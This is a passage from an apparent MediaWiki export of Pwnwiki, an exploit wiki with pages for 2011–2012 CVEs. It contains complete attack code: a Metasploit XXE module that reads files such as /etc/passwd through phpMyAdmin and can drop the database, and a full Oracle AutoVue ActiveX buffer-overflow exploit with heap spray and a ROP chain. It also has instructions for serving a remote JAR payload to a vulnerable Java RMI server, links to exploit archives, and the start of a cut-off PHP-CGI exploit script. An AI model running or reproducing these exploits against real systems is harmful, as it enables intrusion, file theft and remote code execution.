      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2011-3556 — Proof of Concept (PoC)  ## Disclaimer  This tool is a Python 3 implementation of an existing [proof of concept (PoC)](https://www.exploit-db..."</comment>
      <origin>960</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1707" sha1="720jr6c4bvn1j64eruva2rqzf3s1d2c" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2011-3556 — Proof of Concept (PoC)

## Disclaimer

This tool is a Python 3 implementation of an existing [proof of concept (PoC)](https://www.exploit-db.com/raw/17535) made by mihi for the [Metasploit Framework](https://www.metasploit.com/).

## Prerequisites

To use the module, simply follow the instructions below:

```sh
# Clone this repository locally.
$ git clone https://github.com/sk4la/cve_2011_3556.git &amp;&amp; cd cve_2011_3556/

# Optionally set the `x` bit to be able to execute the script directly.
$ chmod u+x exploit.py

$ ./exploit.py --help &amp;&amp; echo "It works!"
```

## Usage

### Command-line

To be remotely loaded by the vulnerable Java RMI server, the payload (a JAR binary) must be served as an HTTP resource. One could quickly serve it using the famous `python3 -m http.server`.

Once the payload is made available for download, simply execute the `exploit.py` script to trigger the vulnerability.

```sh
$ python3 -m http.server --bind DELIVERY_HOST DELIVERY_PORT &amp;
$ ./exploit.py -h VULNERABLE_HOST -u http://DELIVERY_HOST:DELIVERY_PORT/PAYLOAD.jar`
```

&gt; In case the payload is a Meterpreter (Metasploit Framework), do not forget to `use exploit/multi/handler`.

### Library

This module can also be used as a library by importing the `cve_2011_3556` module to your current namespace:

```python
from cve_2011_3556 import JavaRMIExploit

JavaRMIExploit("127.0.0.1", "http://127.0.0.1/payload.jar").exploit()
```

It's as simple as that!

## Credits

Special thanks to mihi for the initial implementation of the Metasploit Framework [module](https://www.exploit-db.com/raw/17535).

&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2011-3556.zip</text>
      <sha1>720jr6c4bvn1j64eruva2rqzf3s1d2c</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-3872 Puppet MITM攻擊漏洞</title>
    <ns>0</ns>
    <id>721</id>
    <revision>
      <id>961</id>
      <timestamp>2021-04-03T06:36:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2011-3872.zip"</comment>
      <origin>961</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="3uc1eahhrv3heqs1wco8wey5pija5sc" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2011-3872.zip</text>
      <sha1>3uc1eahhrv3heqs1wco8wey5pija5sc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-4107 phpMyAdmin XXE漏洞</title>
    <ns>0</ns>
    <id>722</id>
    <revision>
      <id>962</id>
      <timestamp>2021-04-03T06:37:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit #..."</comment>
      <origin>962</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8079" sha1="k73bv9i9wknj62pii5e4ee123cqfsbz" xml:space="preserve">==POC==
&lt;pre&gt;
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        =&gt; 'phpMyAdmin 3.3.X and 3.4.X - Local File Inclusion',
			'Version'     =&gt; '1.0',
			'Description' =&gt; %q{CVE-2011-4107 PoC - Importing a specially-crafted XML file which contains an XML entity injection permits to retrieve a local file (limited by the privileges of the user running the web server).
			The attacker must be logged in to MySQL via phpMyAdmin.
			Works on Windows and Linux Versions 3.3.X and 3.4.X},
			'References'  =&gt;
				[
					[ 'CVE', '2011-4107' ],
                                        [ 'OSVDB', '76798' ],
                                        [ 'BID', '50497' ],
                                        [ 'URL', 'http://www.secforce.com/blog/2012/01/cve-2011-4107-poc-phpmyadmin-local-file-inclusion-via-xxe-injection'],
				],
			'Author'      =&gt; [ 'Marco Batista' ],
			'License'     =&gt; MSF_LICENSE
			)

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('FILE', [ true,  "File to read", '/etc/passwd']),
				OptString.new('USER', [ true,  "Username", 'root']),
				OptString.new('PASS', [ false,  "Password", 'password']),
				OptString.new('DB', [ true,  "Database to use/create", 'hddaccess']),
				OptString.new('TBL', [ true,  "Table to use/create and read the file to", 'files']),
				OptString.new('APP', [ true,  "Location for phpMyAdmin URL", '/phpmyadmin']),
				OptString.new('DROP', [ true,  "Drop database after reading file?", 'true']),
			],self.class)
	end

	def loginprocess
		# HTTP GET TO GET SESSION VALUES
		getresponse = send_request_cgi({
			'uri'     =&gt; datastore['APP']+'/index.php',
			'method'  =&gt; 'GET',
			'version' =&gt; '1.1',
			}, 25)

		if (getresponse.nil?)
			print_error("no response for #{ip}:#{rport}")
		elsif (getresponse.code == 200)
			print_status("Received #{getresponse.code} from #{rhost}:#{rport}")
		elsif (getresponse and getresponse.code == 302 or getresponse.code == 301)
			print_status("Received 302 to #{getresponse.headers['Location']}")
		else
			print_error("Received #{getresponse.code} from #{rhost}:#{rport}")
		end

		valuesget = getresponse.headers["Set-Cookie"]
		varsget = valuesget.split(" ")

		#GETTING THE VARIABLES NEEDED
		phpMyAdmin = varsget.grep(/phpMyAdmin/).last
		pma_mcrypt_iv = varsget.grep(/pma_mcrypt_iv/).last
		# END HTTP GET 

		# LOGIN POST REQUEST TO GET COOKIE VALUE
		postresponse = send_request_cgi({
			'uri'     =&gt; datastore['APP']+'/index.php',
			'method'  =&gt; 'POST',
			'version' =&gt; '1.1',
			'headers' =&gt;{
					'Content-Type' =&gt; 'application/x-www-form-urlencoded',
					'Cookie' =&gt; "#{pma_mcrypt_iv} #{phpMyAdmin}"
		                    },
			'data'    =&gt; 'pma_username='+datastore['USER']+'&amp;pma_password='+datastore['PASS']+'&amp;server=1'
			}, 25)		

		if (postresponse["Location"].nil?)
			print_status("TESTING#{postresponse.body.split("'").grep(/token/).first.split("=").last}")
			tokenvalue = postresponse.body.split("'").grep(/token/).first.split("=").last			
		else
			tokenvalue = postresponse["Location"].split("&amp;").grep(/token/).last.split("=").last
		end
		
		
		valuespost = postresponse.headers["Set-Cookie"]
		varspost = valuespost.split(" ")
		
		#GETTING THE VARIABLES NEEDED
		pmaUser = varspost.grep(/pmaUser-1/).last
		pmaPass = varspost.grep(/pmaPass-1/).last

		return "#{pma_mcrypt_iv} #{phpMyAdmin} #{pmaUser} #{pmaPass}",tokenvalue
		# END OF LOGIN POST REQUEST
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, Rex::ConnectionError =&gt;e
			print_error(e.message)
		rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =&gt;e
			print_error(e.message)
	end

	def readfile(cookie,tokenvalue)
		#READFILE TROUGH EXPORT FUNCTION IN PHPMYADMIN
		getfiles = send_request_cgi({
			'uri'     =&gt; datastore['APP']+'/export.php',
			'method'  =&gt; 'POST',
			'version' =&gt; '1.1',
			'headers' =&gt;{
					'Cookie' =&gt; cookie
			            },
			'data'    =&gt; 'db='+datastore['DB']+'&amp;table='+datastore['TBL']+'&amp;token='+tokenvalue+'&amp;single_table=TRUE&amp;export_type=table&amp;sql_query=SELECT+*+FROM+%60files%60&amp;what=texytext&amp;texytext_structure=something&amp;texytext_data=something&amp;texytext_null=NULL&amp;asfile=sendit&amp;allrows=1&amp;codegen_structure_or_data=data&amp;texytext_structure_or_data=structure_and_data&amp;yaml_structure_or_data=data'
			}, 25)
		
		if (getfiles.body.split("\n").grep(/== Dumping data for table/).empty?)
			print_error("Error reading the file... not enough privilege? login error?")			
		else
			print_status("#{getfiles.body}")
		end
	end


	def dropdatabase(cookie,tokenvalue)
		dropdb = send_request_cgi({
			'uri'     =&gt; datastore['APP']+'/sql.php?sql_query=DROP+DATABASE+%60'+datastore['DB']+'%60&amp;back=db_operations.php&amp;goto=main.php&amp;purge=1&amp;token='+tokenvalue+'&amp;is_js_confirmed=1&amp;ajax_request=false',
			'method'  =&gt; 'GET',
			'version' =&gt; '1.1',
			'headers' =&gt;{
					'Cookie' =&gt; cookie
			            },
			}, 25)

			print_status("Dropping database: "+datastore['DB'])
	end

	def run
		cookie,tokenvalue = loginprocess()
	
		print_status("Login at #{datastore['RHOST']}:#{datastore['RPORT']}#{datastore['APP']} using #{datastore['USER']}:#{datastore['PASS']}")	
	
		craftedXML =  "------WebKitFormBoundary3XPL01T\n"
		craftedXML &lt;&lt; "Content-Disposition: form-data; name=\"token\"\n\n"
		craftedXML &lt;&lt; tokenvalue+"\n"
		craftedXML &lt;&lt; "------WebKitFormBoundary3XPL01T\n"
		craftedXML &lt;&lt; "Content-Disposition: form-data; name=\"import_type\"\n\n"
		craftedXML &lt;&lt; "server\n"
		craftedXML &lt;&lt; "------WebKitFormBoundary3XPL01T\n"
		craftedXML &lt;&lt; "Content-Disposition: form-data; name=\"import_file\"; filename=\"exploit.xml\"\n"
		craftedXML &lt;&lt; "Content-Type: text/xml\n\n"
		craftedXML &lt;&lt; "&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n"
		craftedXML &lt;&lt; "&lt;!DOCTYPE ficheiro [  \n"
		craftedXML &lt;&lt; "  &lt;!ENTITY conteudo SYSTEM \"file:///#{datastore['FILE']}\" &gt; ]&gt;\n"
		craftedXML &lt;&lt; "&lt;pma_xml_export version=\"1.0\" xmlns:pma=\"http://www.phpmyadmin.net/some_doc_url/\"&gt;\n"
		craftedXML &lt;&lt; "    &lt;pma:structure_schemas&gt;\n"
		craftedXML &lt;&lt; "        &lt;pma:database name=\""+datastore['DB']+"\" collation=\"utf8_general_ci\" charset=\"utf8\"&gt;\n"
		craftedXML &lt;&lt; "            &lt;pma:table name=\""+datastore['TBL']+"\"&gt;\n"
		craftedXML &lt;&lt; "                CREATE TABLE `"+datastore['TBL']+"` (`file` varchar(20000) NOT NULL);\n"
		craftedXML &lt;&lt; "            &lt;/pma:table&gt;\n"
		craftedXML &lt;&lt; "        &lt;/pma:database&gt;\n"
		craftedXML &lt;&lt; "    &lt;/pma:structure_schemas&gt;\n"
		craftedXML &lt;&lt; "    &lt;database name=\""+datastore['DB']+"\"&gt;\n"
		craftedXML &lt;&lt; "        &lt;table name=\""+datastore['TBL']+"\"&gt;\n"
		craftedXML &lt;&lt; "            &lt;column name=\"file\"&gt;&amp;conteudo;&lt;/column&gt;\n"
		craftedXML &lt;&lt; "        &lt;/table&gt;\n"
		craftedXML &lt;&lt; "    &lt;/database&gt;\n"
		craftedXML &lt;&lt; "&lt;/pma_xml_export&gt;\n\n"
		craftedXML &lt;&lt; "------WebKitFormBoundary3XPL01T\n"
		craftedXML &lt;&lt; "Content-Disposition: form-data; name=\"format\"\n\n"
		craftedXML &lt;&lt; "xml\n"
		craftedXML &lt;&lt; "------WebKitFormBoundary3XPL01T\n"
		craftedXML &lt;&lt; "Content-Disposition: form-data; name=\"csv_terminated\"\n\n"
		craftedXML &lt;&lt; ",\n\n"
		craftedXML &lt;&lt; "------WebKitFormBoundary3XPL01T--"
		
	
		print_status("Grabbing that #{datastore['FILE']} you want...")
		res = send_request_cgi({
			'uri'     =&gt; datastore['APP']+'/import.php',
			'method'  =&gt; 'POST',
			'version' =&gt; '1.1',
			'headers' =&gt;{
					'Content-Type' =&gt; 'multipart/form-data; boundary=----WebKitFormBoundary3XPL01T',
					'Cookie' =&gt; cookie
			            },
			'data'    =&gt; craftedXML
		}, 25)

		readfile(cookie,tokenvalue)

		if (datastore['DROP'] == "true")
			dropdatabase(cookie,tokenvalue)
		else
			print_status("Database was not dropped: "+datastore['DB'])			
		end

	end
end


&lt;/pre&gt;</text>
      <sha1>k73bv9i9wknj62pii5e4ee123cqfsbz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-4862 FreeBSD 7.3 through 9.0任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>723</id>
    <revision>
      <id>963</id>
      <timestamp>2021-04-03T06:39:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-4862.zip"</comment>
      <origin>963</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="ruv7e9417yzajlxqt875lri4u1kaya1" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-4862.zip</text>
      <sha1>ruv7e9417yzajlxqt875lri4u1kaya1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-0056 Linux kernel before 3.2.2特權提升漏洞</title>
    <ns>0</ns>
    <id>724</id>
    <revision>
      <id>964</id>
      <timestamp>2021-04-03T06:46:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-0056.zip"</comment>
      <origin>964</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="jrls83pdofod4504abz2nzhvbunfl3q" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-0056.zip</text>
      <sha1>jrls83pdofod4504abz2nzhvbunfl3q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-0549 Oracle AutoVue ActiveX Control SetMarkupMod 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>2781</id>
    <revision>
      <id>3282</id>
      <timestamp>2021-05-26T01:07:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for m..."</comment>
      <origin>3282</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11933" sha1="os30ctjpe8hcoag5rq0phc4fktdbyf5" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
 Rank = NormalRanking

 include Msf::Exploit::Remote::HttpServer::HTML
 include Msf::Exploit::Remote::Seh
 include Msf::Exploit::Remote::BrowserAutopwn

 autopwn_info({
  :ua_name    =&gt; HttpClients::IE,
  :ua_minver  =&gt; "6.0",
  :ua_maxver  =&gt; "9.0",
  :javascript =&gt; true,
  :os_name    =&gt; OperatingSystems::WINDOWS,
  :classid    =&gt; "{B6FCC215-D303-11D1-BC6C-0000C078797F}",
  :method     =&gt; "SetMarkupMode",
  :rank       =&gt; NormalRanking
 })


 def initialize(info = {})
  super(update_info(info,
   'Name'           =&gt; 'Oracle AutoVue ActiveX Control SetMarkupMode Buffer Overflow',
   'Description'    =&gt; %q{
     This module exploits a vulnerability found in the AutoVue.ocx ActiveX control.
    The vulnerability, due to the insecure usage of an strcpy like function in the
    SetMarkupMode method, when handling a specially crafted sMarkup argument, allows
    to trigger a stack based buffer overflow which leads to code execution under the
    context of the user visiting a malicious web page.

    The module has been successfully tested against Oracle AutoVue Desktop Version
    20.0.0 (AutoVue.ocx 20.0.0.7330) on IE 6, 7, 8 and 9 (Java 6 needed to DEP and
    ASLR bypass).
   },
   'Author'         =&gt;
    [
     'Brian Gorenc', # Vulnerability discovery
     'juan' # Metasploit module
    ],
   'License'        =&gt; MSF_LICENSE,
   'References'     =&gt;
    [
     [ 'CVE', '2012-0549' ],
     [ 'BID', '53077' ],
     [ 'OSVDB', '81439' ],
     [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-12-05' ],
     [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html' ]
    ],
   'DefaultOptions' =&gt;
    {
     'EXITFUNC' =&gt; 'process',

    },
   'Payload'        =&gt;
    {
     'Space' =&gt; 948,
     'DisableNops' =&gt; true,
    },
   'DefaultOptions'  =&gt;
    {
     'InitialAutoRunScript' =&gt; 'migrate -f'
    },
   'Platform' =&gt; 'win',
   'Targets'        =&gt;
    [
     # AutoVue.ocx 20.0.0.7330
     [ 'Automatic', {} ],
     [
      'IE 6 on Windows XP SP3',
      {
       'SprayBlocks' =&gt; 0x185,
       'SprayCounter' =&gt; '0x5f2', # 0x0c0c0c08
       'SprayOffset' =&gt; '0x600', # 0x0c0c0c24
       'Offset' =&gt; 1052,
       'Ret' =&gt; 0x0c0c0c0c,
       'Rop' =&gt; nil,
       'RandomHeap' =&gt; false
      }
     ],
     [
      'IE 7 on Windows XP SP3 / Windows Vista SP2',
      {
       'SprayBlocks' =&gt; 0x185,
       'SprayCounter' =&gt; '0x5f2', # 0x0c0c0c08
       'SprayOffset' =&gt; '0x600', # 0x0c0c0c24
       'Offset' =&gt; 1052,
       'Ret' =&gt; 0x0c0c0c0c,
       'Rop' =&gt; nil,
       'RandomHeap' =&gt; false
      }
     ],
     [
      'IE 8 with Java 6 on Windows XP SP3/7 SP1/Vista SP2',
      {
       'SprayBlocks' =&gt; 0x185,
       'SprayCounter' =&gt; '0x5f2', # 0x0c0c0c08
       'SprayStackPivot' =&gt; '0x5f6', # 0x0c0c0c10
       'SprayOffset' =&gt; '0x5fc', # 0x0c0c0c1c
       'Offset' =&gt; 1052,
       'Ret' =&gt; 0x0c0c0c0c,
       'Rop' =&gt; :jre,
       'RandomHeap' =&gt; false,
      }
     ],
     [
      'IE 9 with Java 6 on Windows 7 SP1',
      {
       'SprayBlocks' =&gt; 0x1000,
       'SprayNops' =&gt; '0x5f6', # 0x0c0c0bfc
       'SprayCounter' =&gt; '0x5fc', # 0x0c0c0c08
       'SprayStackPivot' =&gt; '0x600', # 0x0c0c0c10
       'SprayOffset' =&gt; '0x606', # 0x0c0c0c1c
       'Offset' =&gt; 1052,
       'Ret' =&gt; 0x0c0c0c0c,
       'Rop' =&gt; :jre,
       'RandomHeap' =&gt; true,
      }
     ]
    ],
   'Privileged'     =&gt; false,
   'DisclosureDate' =&gt; 'Apr 18 2012',
   'DefaultTarget'  =&gt; 0))

  register_options(
   [
    OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
   ], self.class
  )

 end

 def get_easy_spray(t, js_code, js_nops, js_counter)

  spray = &lt;&lt;-JS
  var heap_obj = new heapLib.ie(0x20000);
  var code = unescape("#{js_code}");
  var nops = unescape("#{js_nops}");
  var counter = unescape("#{js_counter}");

  while (nops.length &lt; 0x80000) nops += nops;

  var offset = nops.substring(0, #{t['SprayCounter']});
  var offset_2 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length);
  var block_used = code.length + offset_2.length + counter.length + offset.length;
  var shellcode = offset + counter + offset_2  + code + nops.substring(0, 0x800 - block_used);

  while (shellcode.length &lt; 0x40000) shellcode += shellcode;
  var block = shellcode.substring(0, (0x80000-6)/2);

  heap_obj.gc();
  for (var z=1; z &lt; #{t['SprayBlocks']}; z++) {
   heap_obj.alloc(block);
  }

  JS

  return spray

 end

 def get_aligned_spray(t, js_code, js_nops, js_counter, js_stack_pivot)

  spray = &lt;&lt;-JS
  var heap_obj = new heapLib.ie(0x20000);
  var code = unescape("#{js_code}");
  var nops = unescape("#{js_nops}");
  var counter = unescape("#{js_counter}");
  var stack_pivot = unescape("#{js_stack_pivot}")

  while (nops.length &lt; 0x80000) nops += nops;

  var offset = nops.substring(0, #{t['SprayCounter']});
  var offset_2 = nops.substring(0, #{t['SprayStackPivot']} - offset.length - counter.length);
  var offset_3 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length - offset_2.length - stack_pivot.length);
  var block_used = code.length + offset_3.length + stack_pivot.length + offset_2.length + counter.length + offset.length;
  var shellcode = offset + counter + offset_2  + stack_pivot + offset_3 + code + nops.substring(0, 0x800 - block_used);

  while (shellcode.length &lt; 0x40000) shellcode += shellcode;
  var block = shellcode.substring(0, (0x80000-6)/2);

  heap_obj.gc();
  for (var z=1; z &lt; #{t['SprayBlocks']}; z++) {
   heap_obj.alloc(block);
  }

  JS

  return spray

 end

 # Spray published by corelanc0d3r
 # Exploit writing tutorial part 11 : Heap Spraying Demystified
 # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
 def get_random_spray(t, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot)

  spray = &lt;&lt;-JS

  function randomblock(blocksize)
  {
   var theblock = "";
   for (var i = 0; i &lt; blocksize; i++)
   {
    theblock += Math.floor(Math.random()*90)+10;
   }
   return theblock;
  }

  function tounescape(block)
  {
   var blocklen = block.length;
   var unescapestr = "";
   for (var i = 0; i &lt; blocklen-1; i=i+4)
   {
    unescapestr += "%u" + block.substring(i,i+4);
   }
   return unescapestr;
  }

  var heap_obj = new heapLib.ie(0x10000);

  var code = unescape("#{js_code}");
  var nops = unescape("#{js_nops}");
  var nops_90 = unescape("#{js_90_nops}");
  var counter = unescape("#{js_counter}");
  var stack_pivot = unescape("#{js_stack_pivot}")

  while (nops_90.length &lt; 0x80000) nops_90 += nops_90;

  for (var i=0; i &lt;  #{t['SprayBlocks']}; i++) {
   var padding = unescape(tounescape(randomblock(0x1000)));
   while (padding.length &lt; 0x1000) padding+= padding;


   var offset = padding.substring(0, #{t['SprayNops']});
   var offset_2 = padding.substring(0, #{t['SprayCounter']} - offset.length - nops.length);
   var offset_4 = padding.substring(0, #{t['SprayOffset']} - offset.length -  nops.length - offset_2.length - counter.length - nops.length - stack_pivot.length);
   var block_used = code.length + offset_4.length + stack_pivot.length + nops.length + counter.length + offset_2.length + nops.length + offset.length;
   var single_sprayblock = offset + nops + offset_2 + counter + nops  + stack_pivot + offset_4 + code + padding.substring(0, 0x800 - block_used);

   while (single_sprayblock.length &lt; 0x20000) single_sprayblock += single_sprayblock;
   sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
   heap_obj.alloc(sprayblock);
  }

  JS

  return spray
 end


 def junk(n=4)
  return rand_text_alpha(n).unpack("V").first
 end

 def nop
  return make_nops(4).unpack("V").first
 end

 # stackpivot from msvcr71.dll
 def get_stack_pivot_stage_1
  rop = [ 0x7c341ae4 ].pack("V*") # ADD ESP,48 # RETN
  return rop
 end

 # stackpivot from msvcr71.dll
 def get_stack_pivot_stage_2
  rop = [
   0x7c3522ca,  # ADD EAX,20 # RETN
   0x7c348b05,  # XCHG EAX,ESP # RETN
  ].pack("V*")
  rop = rop.gsub(/"/, "\\\"")
  return rop
 end

 # ROP chain (msvcr71.dll) generated by mona.py - See corelan.be
 def get_rop_chain
  rop = [
   0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
   0x00001000,  # (dwSize)
   0x7c347f98,  # RETN (ROP NOP)
   0x7c3415a2,  # JMP [EAX]
   0xffffffff,
   0x7c376402,  # skip 4 bytes
   0x7c345255,  # INC EBX # FPATAN # RETN
   0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
   0x7c344f87,  # POP EDX # RETN
   0x00000040,  # flNewProtect
   0x7c34d201,  # POP ECX # RETN
   0x7c38b001,  # &amp;Writable location
   0x7c347f97,  # POP EAX # RETN
   0x7c37a151,  # ptr to &amp;VirtualProtect() - 0x0EF
   0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
   0x7c345c30,  # ptr to 'push esp #  ret '
  ].pack("V*")

  return rop
 end

 def get_target(agent)
  #If the user is already specified by the user, we'll just use that
  return target if target.name != 'Automatic'

  if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
   return targets[1]  #IE 6 on Windows XP SP3
  elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
   return targets[2]  #IE 7 on Windows XP SP3
  elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
   return targets[2]  #IE 7 on Windows Vista SP2
  elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
   return targets[3]  #IE 8 on Windows XP SP3
  elsif agent =~ /NT 6\.[01]/ and agent =~ /MSIE 8/
   return targets[3]  #IE 8 on Windows 7 SP1/Vista SP2
  elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 9/
   return targets[4]  #IE 9 on Windows 7 SP1
  else
   return nil
  end
 end

 def on_request_uri(cli, request)

  agent = request.headers['User-Agent']
  print_status("User-agent: #{agent}")

  my_target = get_target(agent)

  # Avoid the attack if the victim doesn't have a setup we're targeting
  if my_target.nil?
   print_error("Browser not supported: #{agent}")
   send_not_found(cli)
   return
  end

  p = payload.encoded

  if my_target['Rop'].nil?
   js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
  else
   js_stack_pivot = Rex::Text.to_unescape(get_stack_pivot_stage_1, Rex::Arch.endian(my_target.arch))
   js_code = Rex::Text.to_unescape(get_rop_chain + p, Rex::Arch.endian(my_target.arch))
  end

  js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
  js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))
  js_counter = Rex::Text.to_unescape("\x01\x00\x00\x00", Rex::Arch.endian(my_target.arch))

  js = ""

  if my_target['RandomHeap']
   js = get_random_spray(my_target, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot)
  elsif my_target['Rop']
   js = get_aligned_spray(my_target, js_code, js_nops, js_counter, js_stack_pivot)
  else
   js = get_easy_spray(my_target, js_code, js_nops, js_counter)
  end

  js = heaplib(js, {:noobfu =&gt; true})

  if datastore['OBFUSCATE']
   js = ::Rex::Exploitation::JSObfu.new(js)
   js.obfuscate
  end

  if my_target['Rop'].nil?
   sploit = rand_text_alpha(my_target['Offset'])
  else
   sploit = rand_text_alpha(8)
   sploit &lt;&lt; get_stack_pivot_stage_2
   # +1 because of the escape character in get_stack_pivot_stage_2
   sploit &lt;&lt; rand_text_alpha(my_target['Offset'] - sploit.length + 1)
  end
  sploit &lt;&lt; [my_target.ret].pack("V")

  html = &lt;&lt;-MYHTML
  &lt;html&gt;
  &lt;head&gt;
  &lt;script&gt;
  #{js}
  &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
  &lt;object classid='clsid:B6FCC215-D303-11D1-BC6C-0000C078797F' id='obj' /&gt;
  &lt;/object&gt;
  &lt;script&gt;
   setTimeout(function(){ obj.SetMarkupMode("#{sploit}"); }, 100);
  &lt;/script&gt;
  &lt;/body&gt;
  &lt;/html&gt;
  MYHTML

  html = html.gsub(/^\t\t/, '')

  print_status("Sending html")
  send_response(cli, html, {'Content-Type'=&gt;'text/html'})
 end
end
&lt;/pre&gt;</text>
      <sha1>os30ctjpe8hcoag5rq0phc4fktdbyf5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-1675 Oracle Database MITM攻擊任意命令執行漏洞</title>
    <ns>0</ns>
    <id>725</id>
    <revision>
      <id>965</id>
      <timestamp>2021-04-03T06:49:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-1675.zip"</comment>
      <origin>965</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="78tfi3dn67efkvtzzkumahc0atva2yh" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-1675.zip</text>
      <sha1>78tfi3dn67efkvtzzkumahc0atva2yh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-1823 PHP before 5.3.12 and 5.4.x before 5.4.2任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>731</id>
    <revision>
      <id>973</id>
      <timestamp>2021-04-04T06:05:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/env python # coding=utf-8   import urllib2 import sys   def request_url(url='', data=None, header={}):     page_content = ''     request = urllib2.Req..."</comment>
      <origin>973</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2127" sha1="1qtz00wglq43yo7zl5h77rh7gbz3sbg" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/env python
# coding=utf-8
 
import urllib2
import sys
 
def request_url(url='', data=None, header={}):
    page_content = ''
    request = urllib2.Request(url, data, header)
 
    try:
        response = urllib2.urlopen(request)
        page_content = response.read()
    except Exception, e:
        print '[*] Error: '+str(e)
 
    return page_content
 
 
if __name__=="__main__":
    if len(sys.argv) != 2:
        print '''
        python this.py www.baidu.com
        python this.py www.baidu.com:8080
        '''
        sys.exit()
 
    target_url = sys.argv[1]
    if target_url.endswith('/'):
        target_url = target_url[:-1]
 
    if target_url.startswith('http://') or target_url.startswith('https://'):
        pass
    else:
        target_url = 'http://' + target_url
 
 
    paths = ['/cgi-bin/php', '/cgi-bin/php5', '/cgi-bin/php-cgi', '/cgi-bin/php.cgi']
